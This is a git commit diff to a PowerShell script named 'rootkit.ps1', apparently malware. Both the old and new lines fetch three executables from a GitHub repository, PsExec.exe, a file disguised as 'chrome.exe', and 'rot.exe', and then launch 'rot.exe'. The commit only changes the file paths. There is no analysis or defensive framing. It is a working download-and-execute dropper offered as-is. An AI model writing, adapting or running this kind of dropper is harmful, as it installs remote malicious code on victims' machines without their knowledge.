856566586e2c4dae47456edddb5d0625d672d920
Ccgnnz19 <anonymous.spoof.1973@gmail.com>
2022-03-11 23:12:28 +0100

    Update rootkit.ps1

--- rootkit.ps1
+++ rootkit.ps1
@@ -1,5 +1,5 @@
 $fSiOVdcl99 = new-object System.Net.WebClient
-$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/PsExec.exe','\tmp\PsExec.exe')
-$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/chrome.exe','\tmp\chrome.exe')
-$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/rot.exe','\tmp\rot.exe')
-Start-Process -FilePath "\tmp\rot.exe"
+$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/PsExec.exe','tmp/PsExec.exe')
+$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/chrome.exe','tmp/chrome.exe')
+$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/rot.exe','tmp/rot.exe')
+Start-Process -FilePath "tmp/rot.exe"
